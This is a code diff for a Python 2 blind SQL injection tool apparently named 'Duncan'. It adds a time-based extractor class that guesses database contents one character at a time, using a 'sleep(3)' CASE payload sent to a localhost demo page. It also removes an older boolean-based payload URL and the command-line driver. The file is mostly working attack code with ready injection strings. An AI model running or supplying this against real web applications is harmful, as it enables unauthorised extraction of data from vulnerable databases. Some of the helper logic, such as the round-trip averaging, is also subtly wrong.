@@ -1,8 +1,6 @@
 #!/usr/bin/env python
 
 import threading
-import requests
-import argparse
 import Queue
 
 class Duncan(threading.Thread):
@@ -20,10 +18,11 @@ class Duncan(threading.Thread):
 		self._pos=pos
 		self._charset=sorted(list(set(charset)))
 		self._debug=debug
+		self._q=q
 
 	def debug(self,level,msg):
 		if level<=self._debug:
-			print msg
+			print ("[Pos %d] "%self._pos)+msg
 
 	def run(self):
 		while len(self._charset)>2:
@@ -35,10 +34,10 @@ class Duncan(threading.Thread):
 				self._charset=self._charset[len(self._charset)/2:]
 		if self.decide(self._charset[-1]):
 			self.debug(1,"Position %d: %c" % (self._pos,chr(self._charset[0])))
-			q.put((self._pos,chr(self._charset[0])))
+			self._q.put((self._pos,chr(self._charset[0])))
 		else:
 			self.debug(1,"Position %d: %c" % (self._pos,chr(self._charset[-1])))
-			q.put((self._pos,chr(self._charset[-1])))
+			self._q.put((self._pos,chr(self._charset[-1])))
 
 
 	def decide(self,guess):
@@ -49,44 +48,78 @@ class Duncan(threading.Thread):
 
 		Should return True if the actual ASCII value of a given position is less than guess
 		""" 
-		url="http://localhost/demo/sqli/blind.php?p=1 and ord(substr((%s),%d,1))<%d" % (self._query,self._pos,guess)
+		pass
+
+# See: https://gitorious.org/campzer0/numberguessing/
+class DuncanTime(Duncan):
+	def update_rtt(self,t):
+		self._rttcount=self._rttcount+1
+		self._rttavg=(self._rttavg+t)/self._rttcount
+		if t>self._rttmax:
+			self._rttmax=t
+		if t<self._rttmin:
+			self._rttmin=t
+		self.debug(5,"Round Trip Times - Max: %f Min: %f Avg: %f" % (self._rttmax,self._rttmin,self._rttavg))
+
+	def fallback(self):
+		import math
+
+		len(self._charset)>2
+		expected_linear=(len(self._charset)/2.0)*self._rttmax+self._rttmin
+		expected_binary=math.log(len(self._charset),2)*self._rttmax*0.5
+		self.debug(5,"Expected costs - Linear: %f Binary: %f" % (expected_linear,expected_binary))
+		if expected_linear<expected_binary or len(self._charset)<3:
+			return True
+		return False
+
+	def run(self):
+		import time
+
+		self._rttmin=86400
+		self._rttmax=0
+		self._rttavg=0
+		self._rttcount=0
+
+		chunksize=0.5
+		if self._rttmax>0 and self._rttmin/self._rttmax<1:
+			chunksize=self._rttmin/self._rttmax
+
+		while not self.fallback():
+			guess=self._charset[int(len(self._charset)*chunksize)]
+			self.debug(5,"Max: %d Guess: %d Min: %d" % (self._charset[-1], guess, self._charset[0]))
+			t0=time.time()
+			if self.decide(guess):
+				self._charset=self._charset[0:int(len(self._charset)*chunksize)]
+			else:
+				self._charset=self._charset[int(len(self._charset)*chunksize):]
+			t1=time.time()
+			self.update_rtt(t1-t0)
+		self.debug(3,"[Pos %d] Falling back to linear search. Max: %c Min: %c" % (self._pos,self._charset[-1], self._charset[0]))
+		for i,guess in enumerate(self._charset):
+			if self.decide(guess):
+				self.debug(1,"Position %d: %c" % (self._pos,chr(self._charset[i-1])))	
+				self._q.put((self._pos,chr(self._charset[i-1])))
+				return
+		self.debug(3,"Linear search last element: Min: %c Max: %c" % (self._charset[0],self._charset[-1]))
+		self._q.put((self._pos,chr(self._charset[-1])))
+
+	def decide(self,guess):
+		"""Here you should implement your injection code.
+
+		Arguments:
+		guess -- Guess
+
+		Should return True if the actual ASCII value of a given position is less than guess
+		""" 
+		import requests,time
+		t0=time.time()
+		url="http://localhost/demo/sqli/time.php?p=1 and case when ord(substr((%s),%d,1))<%d then sleep(3) else 1 end" % (self._query,self._pos,guess)
 		self.debug(6,url)
 		r=requests.get(url)
-		
-		if r.content.find(':)')>-1:
+		t1=time.time()
+		self.debug(4, "Guess: %d, Time: %f" % (guess,t1-t0))
+		if t1-t0>2:
 			return True
 		else:
 			return False
 
-parser = argparse.ArgumentParser(description='Duncan - Blind SQL injector skeleton')
-parser.add_argument("--query",required=True,help="The query to be run. Should contain only one attribute.")
-parser.add_argument("--pos-start",default=1,type=int,help="First character position to look up")
-parser.add_argument("--pos-end",default=5,type=int,help="Last character position to look up")
-parser.add_argument("--ascii-start",default=32,type=int,help="Start of the ASCII range to test")
-parser.add_argument("--ascii-end",default=123,type=int,help="End of the ASCII range to test")
-parser.add_argument("--charset",help="Custom character set")
-parser.add_argument("--debug",default=0,type=int,help="Debug - higher values for more verbosity")
-
-args = parser.parse_args()
-q=Queue.Queue()
-threads=[]
-
-charset=[]
-if args.charset is not None:
-	charset=[ord(c) for c in list(args.charset)]
-else:
-	charset=range(args.ascii_start,args.ascii_end+1)
-
-for p in xrange(args.pos_start,args.pos_end):
-	thread=Duncan(args.query,p,q,charset,args.debug)
-	threads.append(thread)
-	thread.start()
-
-for t in threads:
-	t.join()
-
-l=[]
-while not q.empty():
-	l.append(q.get())
-
-print ''.join([i[1] for i in sorted(list(l))])
